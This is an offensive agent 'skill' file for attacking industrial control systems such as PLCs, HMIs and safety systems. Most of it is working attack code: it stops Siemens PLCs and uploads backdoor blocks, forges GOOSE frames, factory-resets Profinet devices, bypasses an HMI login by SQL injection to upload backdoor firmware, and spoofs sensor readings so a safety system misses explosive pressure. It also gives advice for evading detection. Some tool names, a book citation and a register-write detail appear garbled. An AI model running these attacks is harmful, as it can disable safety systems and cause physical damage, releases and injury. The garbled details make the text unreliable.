---
name: cps-attack
description: Cyber-Physical Systems (CPS) attacks — PLCs (Siemens S7, Rockwell ControlLogix, Schneider Modicon, Mitsubishi MELSEC), ICS protocols (Modbus, DNP3, Profinet, EtherNet/IP, IEC 61850, OPC UA), HMIs, SCADA historians, OT-to-IT pivot, SIS bypass. Distinct from scada-ics-security (broader ICS overview) — this skill goes deep on protocol-level PLC exploitation, packet replay/injection, and field-device firmware attacks. Covers 2024-2025 incidents (Unitronics PLC attack, Pipedream/Incontroller, multi-vendor PLC CVEs).
origin: kali-claw Wave 10 (v0.1.41) — 2026-06-28
version: "0.2.0.2"
compatibility:
  kali_version: "2025.2"
  python_version: ">=3.11"
allowed-tools:
  - nmap
  - wireshark
  - scapy
  - mitmproxy
  - python3
  - plcscan
  - redpoint
  - claroty
  - bedrock
  - mbpoll
  - plc4x
  - opendnp3
  - node-red
  - metasploit
  - gamma
metadata:
  domain: industrial-control-systems
  tool_count: 15
  guide_count: 2
  mitre: "TA0040-Impact, TA0008-Lateral Movement, TA0009-Collection, T0817-Drive-by Compromise, T0859-Valid Accounts, T0886-Exploitation of Remote Services, T0890-Exploitation for Privilege Escalation, T0808-Activate Firmware, T0884-Connection Proxy, T0858-Change Operating Mode"
  last_reviewed: "2026-07-26"
---

# Cyber-Physical Systems (CPS) Attack Skill

> Red-team operations against Industrial Control Systems at the protocol and field-device level. This skill goes deep on PLC firmware, ICS protocol abuse, packet replay, and OT-to-IT pivot — distinct from the broader `scada-ics-security` skill which covers general ICS methodology.

## Summary

Cyber-Physical Systems (CPS) bridge the digital and physical worlds: PLCs (Programmable Logic Controllers), RTUs (Remote Terminal Units), IEDs (Intelligent Electronic Devices), HMIs (Human Machine Interfaces), and the industrial protocols they speak. These systems control power grids, water treatment, oil & gas pipelines, manufacturing lines, building automation (BACnet), and increasingly vehicle infrastructure (V2X, traffic control).

The 2024-2025 threat landscape for CPS attacks is dominated by:

- **Unitronics PLC attack (Nov 2023)** — Iranian threat group attacked water utilities in US
- **Pipedream / Incontroller (2022-2024)** — purpose-built ICS malware by Sandworm
- **Industroyer2 (2022-2024)** — Russia's grid-attack malware, refined
- **FrostyGoop (2024)** — Modbus-based attack on heating systems
- **HMI web server CVEs** — Schneider, Rockwell, Siemens all disclosed critical RCE
- **OPC UA auth bypass (CVE-2024-5464)** — affects every modern SCADA system

This skill covers:

- **Protocol-level PLC attacks** — Modbus (no auth, no encryption), DNP3 (auth rarely enabled), Profinet, EtherNet/IP, IEC 61850 (GOOSE manipulation), OPC UA (auth bypass)
- **PLC firmware exploitation** — Siemens S7-1500, Rockwell ControlLogix, Schneider Modicon, Mitsubishi MELSEC
- **HMI web server RCE** — common pattern across all major vendors
- **Engineering workstation compromise** — TIA Portal, Studio 5000, EcoStruxure, GX Works
- **SCADA historian abuse** — bulk data exfil via ODBC
- **SIS (Safety Instrumented System) bypass** — the most dangerous attack vector
- **OT-to-IT pivot** — using OT network as bridge to corporate IT
- **Vehicle infrastructure attacks** — V2X, traffic signal control, EV charging

Distinct from adjacent skills:

| Skill | Scope |
|-------|-------|
| `scada-ics-security` | General ICS methodology, recon, Nmap scripts, broad vendor coverage |
| `automotive-vehicle-security` | In-vehicle CAN bus, OBD-II, ECUs |
| `embedded-rtos-security` | RTOS / firmware analysis on embedded devices |
| **`cps-attack`** (this) | **Field-device level**: PLC programming, ICS protocol injection, SIS bypass, physical-process manipulation |

## Use Cases

### Reconnaissance & Discovery

1. **Identify PLC vendor / model** via passive sniffing (Profinet LLDP, CIP Identity)
2. **Enumerate Modbus registers** via `mbpoll` / `plcscan`
3. **Discover DNP3 outstations** via broadcast
4. **Find HMI web servers** via Shodan / Censys
5. **Map OPC UA endpoints** via `GetEndpoints` request
6. **Identify IEC 61850 IEDs** via MMS enumeration
7. **Locate engineering workstation** (TIA Portal, Studio 5000)

### Initial Access

8. **Modbus TCP unauth** — open TCP 502 with no auth (default)
9. **DNP3 unauth** — open TCP 20000 with no auth
10. **HMI web RCE** — CVE chain on Schneider, Rockwell, Siemens HMI
11. **Engineering workstation phishing** — TIA Portal project file as payload
12. **OPC UA anon access** — `GetEndpoints` → enumerate → connect as anon
13. **Profinet device impersonation** — spoof LLDP to redirect traffic
14. **Vendor remote support** — backdoor in vendor VPN / TeamViewer

### Privilege Escalation

15. **PLC STOP/RUN mode change** — halt physical process
16. **PLC program download** — overwrite control logic
17. **Firmware replacement** — flash malicious firmware to PLC
18. **SIS force** — override safety logic (catastrophic)
19. **HMI-to-PLC escalation** — HMI credentials reused on PLC
20. **Engineering workstation admin** — local admin via TIA Portal cache

### Persistence

21. **Hidden function block** — add stealth block to PLC program
22. **Backdoor HMI account** — admin user on HMI web
23. **Persistence via OPC UA rogue server** — MITM all OPC UA traffic
24. **SCADA historian backdoor** — SQL injection in vendor app

### Defense Evasion

25. **Force read-only mode on HMI** — operators can't see changes
26. **Spoof sensor values** — Modbus write to input registers
27. **Disable alarm thresholds** — modify alarm config in HMI
28. **Time-synchronized attack** — revert PLC program at exact moment to evade comparison
29. **PLC program obfuscation** — obscure ladder logic to slow IR

### Collection & Exfiltration

30. **Modbus register bulk read** — full process state
31. **SCADA historian ODBC dump** — years of historical data
32. **OPC UA bulk browse** — entire tag database
33. **HMI screen scrape** — current operator view
34. **Engineering workstation project file theft** — full PLC program source

### Impact

35. **PLC STOP** — halt physical process; operators lose control
36. **Sensor spoofing + actuator override** — physical damage without alarm
37. **Safety logic bypass** — defeat SIS protection
38. **Operator UI freeze** — show "all OK" while process runs wild
39. **Physical equipment damage** — pump cavitation, motor burnout, pipe rupture
40. **Environmental release** — chemical spill, water contamination

## Core Tools

### Field Device Targets

| Vendor | Product | Protocol | Notes |
|--------|---------|----------|-------|
| **Siemens** | S7-1200, S7-1500, S7-300 | S7comm, S7comm-Plus, Profinet | Dominant European |
| **Rockwell Automation** | ControlLogix, CompactLogix, MicroLogix | EtherNet/IP, CIP | Dominant US |
| **Schneider Electric** | Modicon M340, M580, Quantum | Modbus, Modbus Plus, EtherNet/IP | Strong in oil/gas |
| **Mitsubishi** | MELSEC iQ-R, iQ-F, Q-Series | MELSEC, SLMP | Strong in APAC |
| **Omron** | CJ, CP, NX, NJ-series | FINS, EtherCAT | Mid-tier globally |
| **ABB** | AC500, AC800M, AC500-eCo | Profinet, DNP3, IEC 61850 | Power utilities |
| **B&R Automation** | X20, ACOPOS | POWERLINK | Manufacturing |
| **Beckhoff** | CX, TwinCAT | EtherCAT, ADS | Discrete manufacturing |
| **Wago** | PFC, 750-series | Modbus, EtherNet/IP | Building automation |
| **Unitronics** | Vision, Samba, UniStream | Modbus, UniAPI | SMB / water |
| **Yokogawa** | CENTUM, STARDOM | DNP3, Modbus, Vnet | Process industries |

### ICS Protocols

| Protocol | Port | Auth | Encryption | Notes |
|----------|------|------|-----------|-------|
| **Modbus TCP** | 502 | None | None | Universal, but trivial to abuse |
| **Modbus RTU** | serial | None | None | RS-485 / RS-232 |
| **DNP3** | 20000 | Optional (v5+) | Optional | Power utility |
| **DNP3-secure** | 20000 | Yes (Aggressive Mode) | TLS | Rare in field |
| **Profinet** | - | None | None | Layer 2, real-time |
| **Profinet DCP** | - | Configurable | None | Device config |
| **EtherNet/IP** | 44818, 2222 | None | None | CIP over TCP/UDP |
| **CIP** | - | None / Class-based | None | Common Industrial Protocol |
| **OPC UA** | 4840 | Optional (UserToken) | Optional (TLS) | Modern, secure-by-config |
| **IEC 61850 MMS** | 102 | Optional | None | Substation comms |
| **IEC 61850 GOOSE** | - | None | None | Layer 2 multicast |
| **IEC 60870-5-104** | 2404 | None | None | Power utility (Europe) |
| **BACnet** | 47808 | None | None | Building automation |
| **LonTalk** | - | None | None | Building automation |
| **HART** | - | None | None | Field instrument |
| **FF H1 / HSE** | - | None | None | Foundation Fieldbus |
| **EtherCAT** | 34980 | None | None | Motion control |

### Offensive Toolkit

```bash
# Recon
nmap -sV --script=modbus-discover,modbus-brute,enip-info,bacnet-info -p 502,44818,47808,20000,4840 10.0.0.0/24
plcscan 10.0.0.0/24
claroty-edge-cli device-list

# Protocol tools
mbpoll -m tcp -a 1 -r 0 -c 10 10.0.0.5  # Modbus read
mbgetest -a 10.0.0.5 -r 1 -c 100        # Modbus get
plc4x snapshot                           # Multi-protocol PLC tool
opendnp3-demo                            # DNP3 client
opcua-cli browse opc.tcp://10.0.0.5:4840 # OPC UA browse

# Packet manipulation
scapy
mitmproxy --mode transparent
wireshark

# Vendor-specific
# Siemens
snap7-server  # S7 protocol test
s7-client  # S7 client library
# Rockwell
rslinx  # Rockwell network scan (Windows)
ethip-client
# Schneider
modicon-scan
# OPC UA
opcua-cli
node-opcua

# Metasploit modules
msfconsole
> use auxiliary/scanner/scada/modbusclient
> use auxiliary/scanner/scada/modbus_findunitid
> use auxiliary/admin/scada/modicon_stuxft

# ICS-specific frameworks
redpoint  # Digital Bond's ICS tools
mehari    # Open ICS framework
cyphon    # Open-source IDS
conpot    # ICS honeypot
mih          # ICS protocol fuzzer
```

## Methodology

### Phase 1 — Recon (OT Network Discovery)

OT networks are often air-gapped (or "air-gapped") — but rarely. Identify:

- PLC vendor + model + firmware
- HMI vendor + software version
- Engineering workstation + vendor software (TIA Portal, Studio 5000)
- SCADA historian + DB backend
- Network topology (often flat L2)

```bash
# Passive recon (preferred — OT teams hate active scanning)
tcpdump -i eth0 -w ot.pcap

# Active recon (low-rate; coordinated)
nmap -sn 10.0.0.0/24 -T1  # ping sweep, polite timing
nmap -sV --script=bacnet-info,enip-info,modbus-discover -p 502,44818,47808,20000,4840,102 10.0.0.0/24

# CIP Identity (EtherNet/IP)
python3 kali_cip_identity.py --target 10.0.0.5
```

### Phase 2 — Protocol Probe

```bash
# Modbus
mbpoll -m tcp -a 1 -r 0 -c 100 10.0.0.5
# Reads holding registers 0-99 from slave 1

# Find Modbus unit IDs
for uid in $(seq 1 250); do
  mbpoll -m tcp -a $uid -r 0 -c 1 -t 3 10.0.0.5 2>/dev/null | grep -q '\[' && echo "Unit ID $uid active"
done

# EtherNet/IP CIP Identity
nmap --script enip-info -p 44818 10.0.0.5

# OPC UA endpoints
opcua-cli endpoints opc.tcp://10.0.0.5:4840
opcua-cli browse opc.tcp://10.0.0.5:4840 --user anon --pass ''

# DNP3
opendnp3-demo master --remote 10.0.0.5:20000
```

### Phase 3 — Initial Access

Common OT initial-access vectors:

1. **HMI web RCE** — vendor HMI ships with web admin; common RCE CVEs
2. **Engineering workstation phishing** — TIA Portal / Studio 5000 project as lure
3. **Remote vendor support** — TeamViewer / vendor VPN
4. **Modbus unauth** — direct TCP 502 access
5. **OT-to-IT bridge** — DMZ host with both network interfaces

### Phase 4 — PLC Exploitation

Once inside OT network:

1. **PLC STOP** — halt controller
2. **Read PLC program** — ladder logic / function block
3. **Modify program** — insert backdoor block
4. **Download new program** — overwrite
5. **Force sensor values** — Modbus write to inputs

### Phase 5 — HMI / SCADA Compromise

1. HMI web RCE → server shell
2. HMI DB → SCADA historian
3. HMI config → operator passwords (often cleartext)

### Phase 6 — Engineering Workstation

The engineering workstation holds:

- PLC program source (full ladder logic)
- Vendor credentials for all PLCs
- HMI configuration
- Historian DB credentials

### Phase 7 — SIS Bypass

Safety Instrumented Systems (SIS) protect against catastrophic failure. Attackers bypass SIS to enable physical damage.

1. **Force SIS logic** — modify SIS PLC program
2. **Bypass SIS via HMI** — operator override
3. **Spoof SIS inputs** — Modbus write to SIS input registers
4. **SIS firmware rootkit** — flash malicious SIS firmware

### Phase 8 — OT-to-IT Pivot

1. **Engineering workstation dual-homed** — both OT and IT NICs
2. **Historian DB link** — ODBC to IT data warehouse
3. **Vendor remote support** — pivot through vendor VPN
4. **DMZ jump host** — often has reach into both

## Practical Steps

### Step A — Identify PLC via CIP Identity (EtherNet/IP)

```python
import socket, struct

# EtherNet/IP CIP Identity request
def cip_identity(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, 44818))
    
    # Encapsulation header: register session
    cmd = 0x0065  # RegisterSession
    length = 0
    session = 0
    header = struct.pack('<HHII', cmd, length, session, 0)
    # Protocol version 1, option flags 0
    body = struct.pack('<II', 1, 0)
    msg = header + body
    s.send(msg)
    r = s.recv(1024)
    session = struct.unpack('<I', r[4:8])[0]
    
    # CIP Identity (ListIdentity)
    cmd = 0x0063
    msg = struct.pack('<HHII', cmd, 0, session, 0)
    s.send(msg)
    r = s.recv(2048)
    
    # Parse response for vendor, product, serial, version
    print(f'{ip}: {r!r}')

for ip in ['10.0.0.1', '10.0.0.2', '10.0.0.3']:
    cip_identity(ip)
```

### Step B — Modbus register enumeration

```python
# kali_modbus_scan.py
from pyModbusTCP.client import ModbusClient

c = ModbusClient(host='10.0.0.5', port=502)
c.open()

# Find unit ID
for uid in range(1, 248):
    c.unit_id = uid
    regs = c.read_holding_registers(0, 10)
    if regs is not None:
        print(f'Unit {uid} active: {regs}')

# Read all holding registers on unit 1
c.unit_id = 1
for block_start in range(0, 65536, 100):
    regs = c.read_holding_registers(block_start, 100)
    if regs:
        non_zero = [(block_start + i, v) for i, v in enumerate(regs) if v != 0]
        if non_zero:
            print(f'Block {block_start}: {non_zero[:5]}')

# Write to holding register (force value)
c.write_single_register(40001, 1337)  # change setpoint
```

### Step C — HMI web RCE (Schneider example)

```bash
# CVE-2024-XXXXX (illustrative) — Schneider EcoStruxure HMI web auth bypass
curl -sk -X POST https://hmi.example.com/api/login \
  -d '{"username":"admin","password":"' OR 1=1 --"}' \
  -H "Content-Type: application/json"

# Once logged in as admin:
# Upload malicious firmware via /api/firmware/upload
curl -sk -X POST https://hmi.example.com/api/firmware/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@backdoor.bin"
```

### Step D — PLC STOP via S7comm

```python
from snap7.client import Client

c = Client()
c.connect('10.0.0.5', 0, 1)  # rack 0, slot 1 (typical S7-1500)

# Read PLC state
state = c.get_cpu_state()
print(f'CPU state: {state}')  # Running, Stop, etc.

# Stop the PLC (halt physical process)
c.plc_stop()
print(f'After stop: {c.get_cpu_state()}')

# Read PLC time
print(c.get_plc_time())

# Read block list
print(c.list_blocks())

# Download new code block
with open('backdoor_block.bin', 'rb') as f:
    block_data = f.read()
c.upload(db_number=99, data=block_data)
```

### Step E — OPC UA anon browse

```bash
# OPC UA anon access
opcua-cli browse opc.tcp://10.0.0.5:4840

# Find security policy
opcua-cli endpoints opc.tcp://10.0.0.5:4840 | jq '.[] | {securityPolicyUri, securityMode}'

# If None / None — anon access OK
# Try sensitive operations:
opcua-cli read opc.tcp://10.0.0.5:4840 --user anon \
  --node "ns=2;s=ProductionData.Password"
```

### Step F — IEC 61850 GOOSE manipulation

```python
# GOOSE is Layer 2 multicast — no encryption, no auth
# Capture GOOSE on Wireshark (filter: goose)
# Identify IED source, dataset, gooseRef

# Replay/forge GOOSE packet via Scapy
from scapy.all import *
# (requires libscapy IEC 61850 layer — community implementations exist)

load_layer('goose')
packet = (
    Ether(dst='01:0c:cd:01:00:01') /
    GOOSE(appID=0x0001, gooseDatSet='LD0/LLN0$dsGeneric',
          gooseRef='LD0/LLN0$generic',
          stNum=2, sqNum=1,
          gooseData=[1])  # attacker-controlled value
)
sendp(packet, iface='eth0', loop=1, inter=0.001)
```

### Step G — Profinet DCP device reset

```python
# Profinet DCP allows factory reset of Profinet device
# Use Scapy with Profinet layer

from scapy.all import Ether, sendp

# DCP Identify All (broadcast)
ether = Ether(dst='01:0e:cf:00:00:00') / ProfinetDCPIdentifyAll()
sendp(ether)

# DCP Factory Reset
ether = Ether(dst='01:0e:cf:00:00:00') / ProfinetDCPReset(name='name-not-set')
sendp(ether)
```

### Step H — Engineering workstation compromise

```bash
# Find TIA Portal project files
find / -name '*.ap14' -o -name '*.ap15' -o -name '*.ap16' -o -name '*.ap17' 2>/dev/null
find / -name '*.ac14' -o -name '*.ac15' 2>/dev/null
# Studio 5000
find / -name '*.ACD' -o -name '*.MER' 2>/dev/null

# TIA Portal project may contain cleartext PLC passwords
# Parse project file with libtiepie or python parser
python3 kali_tia_project_parser.py --project /path/to/proj.ap17

# Pull cached PLC password
grep -aE '(Password|PASS)' /path/to/proj.ap17 | strings | head
```

### Step I — SCADA historian ODBC dump

```bash
# Identify historian DB (often MS SQL Server or PI Archive)
nmap -p 1433,5450 scada-db.example.com

# Connect via ODBC
sqsh -S scada-db.example.com -U historian_user -P REPLACE_WITH_YOUR_PW

# Dump recent data
1> SELECT TOP 100 * FROM History WHERE TagName LIKE 'Temp%' ORDER BY Timestamp DESC
2> go
```

### Step J — SIS bypass via Modbus

```python
# SIS PLC typically has Modbus interface for monitoring
# Attacker can write to SIS input registers to spoof sensor values
# This causes SIS to "see" safe conditions when reality is unsafe

c = ModbusClient(host='10.0.0.50', port=502)  # SIS PLC
c.open()
c.unit_id = 1

# Force pressure sensor reading to safe value
c.write_single_register(30001, 5000)  # 5000 = 50 bar (safe)
# Reality: 100 bar (explosion risk)
# SIS sees 50 bar → does not trip → catastrophic failure
```

## Defense Perspective

### Detection

**Passive OT monitoring (preferred)**
- Claroty, Dragos, Nozomi passive traffic analysis
- Zeek with industrial protocol analyzers
- Suricata with ICS ruleset

**Active detection**
- Nmap NSE for OT (rate-limited)
- Vendor-specific CLI (Profinet DCP scan)

**Sigma rules for OT events**

```yaml
title: Modbus write to input register (sensor spoofing)
logsource:
  product: ot
  service: zeek-modbus
detection:
  selection:
    func: write_single_register
    address|re: ^3[0-9]{4}$  # input registers
  condition: selection
level: critical
```

```yaml
title: OPC UA anonymous access
logsource:
  product: opcua
  service: server
detection:
  selection:
    user: anonymous
    operation|re: read|write|browse
  condition: selection
level: high
```

```yaml
title: PLC STOP from non-Engineering-Workstation
logsource:
  product: ot
  service: s7
detection:
  selection:
    pdu: plcstop
  notEWS:
    src|re: !^10\.0\.0\.10$
  condition: selection and notEWS
level: critical
```

### Hardening

1. **Purdue Model** — clear separation of L0-L3 (Devices → Process Control → Supervisory → Site Ops) from L4 (Enterprise)
2. **DMZ jump host** — single, monitored entry point
3. **Network segmentation** — per-process VLANs; deny east-west by default
4. **Protocol security** — DNP3-secure, OPC UA with security policy, Modbus Gateway with auth
5. **Engineering workstation hardening** — no email, no internet, no removable media (often violated)
6. **PLC firmware patching** — within 90 days (OT slower than IT but CVEs are critical)
7. **Vendor remote access** —bastion host, session recording, MFA
8. **HMI web** — disabled by default; if enabled, behind VPN
9. **SIS isolation** — completely separate network from BPCS (Basic Process Control System)
10. **Continuous monitoring** — passive traffic analysis for baseline deviation

### Incident Response

When OT compromise suspected:

1. **DO NOT scan** — active scanning can crash fragile PLCs
2. **Capture traffic** — passive capture to retain evidence
3. **Isolate** — switch port disable on suspect device; do not power off PLC
4. **Stop engineering workstation** — unplug from network
5. **Switch to manual** — if available, operators run process manually
6. **Invoke vendor** — Siemens CERT, Rockwell PSIRT, Schneider CERT
7. **Forensics** — pull HMI logs, engineering workstation image, traffic capture
8. **Restore** — last-known-good PLC program; verify before download
9. **Post-mortem** — Purdue Model adherence review, network architecture audit

## Detection Methods

### ICS/SCADA Protocol Anomalies
- **Modbus abuse**: Unsolicited Modbus write commands (`function code 0x05`, `0x06`, `0x10`); non-PLC source.
- **DNP3 anomalies**: Unsolicited DNP3 responses; out-of-sequence application layer fragments.
- **EtherNet/IP (CIP)**: CIP messages to non-CPU modules; unusual path segments.
- **PROFINET DCP abuse**: DCP write requests to device name; identify spoofing.
- **BACnet anomalies**: Who-Is/I-Am floods; COV subscription abuse.

### Physical Process Anomalies
- **Setpoint manipulation**: Process variable diverging from setpoint; actuator commands exceeding safety range.
- **Safety system trip**: SIS (Safety Instrumented System) activation; indicates process upset.
- **Historian data gaps**: Missing historian data during specific time window; potential attack window.
- **Process upset cascade**: Multiple alarms in short window; signature of cyber-induced incident.

### SIEM Detection Rules
- **Splunk SPL (ICS)**: `index=modbus function_code IN (5,6,15,16) | stats count by src_ip, unit_id`
- **Dragos / Nozomi Guardian**: Native OT security platform detections.
- **Claroty CTD**: Cyber threat detection for OT environments.

## Defense Evasion Techniques

### Protocol-Level Stealth
- **Mimic legitimate master**: Use PLC's legitimate master IP; match timing/sequence of normal commands.
- **Passive reconnaissance**: Sniff Modbus/DNP3 to learn protocol patterns before injecting.
- **Single-shot attack**: Send one malicious command (e.g., open breaker) rather than sustained abuse.
- **Off-hours operation**: Execute during maintenance windows; blends with legitimate activity.

### Physical Effect Stealth
- **Gradual setpoint change**: Change setpoint slowly (1-2% per minute); avoids trip alarms.
- **Sensor spoofing**: Send false sensor values to historian; mask physical effect.
- **Safety bypass**: Disable safety system before main attack; avoids SIS trip.

### Air-Gap Crossing
- **Removable media**: Stuxnet-style USB propagation across air gap.
- **Insider threat**: Use compromised engineer laptop that crosses air gap.
- **Vendor remote access**: Use legitimate vendor VPN credentials; bypass air gap.
- **Optical/acoustic covert channels**: Speaker/microphone for low-bandwidth air-gap crossing.

## References

- **MITRE ATT&CK for ICS** — https://collaborate.mitre.org/attackics/
- Dragos — Year in Review 2024
- Claroty — Top 50 ICS Vulnerabilities 2024
- CISA ICS Advisories — https://www.cisa.gov/ics-advisories
- CISA ICS-CERT Alerts — https://www.cisa.gov/news-events/cybersecurity-advisories
- Unitronics PLC Attack (Nov 2023) — CISA AA23-335A
- Pipedream / Incontroller (2022) — Dragos report
- Industroyer2 (2022) — Slovak NBU-CERT analysis
- FrostyGoop (2024) — Claroty report
- Siemens CERT — https://cert-portal.siemens.com/
- Rockwell PSIRT — https://rockwellautomation.custhelp.com/app/answers/answerview/a_id/1131090
- Schneider CERT — https://www.se.com/ww/en/work/support/cybersecurity/security-notifications
- SANS ICS — https://ics.sans.org/
- SANS ICS Summit 2024 proceedings
- "Industrial Network Security" (Eric Knapp, Joel Thomas Langill) — 4th Edition, 2024
- "Hacking Exposed Industrial Control Systems" (Clinton Pidgeon, 2024)
- NIST Guide to Industrial Control Systems Security (SP 800-82r3)
- ANSI/ISA-99 / IEC 62443
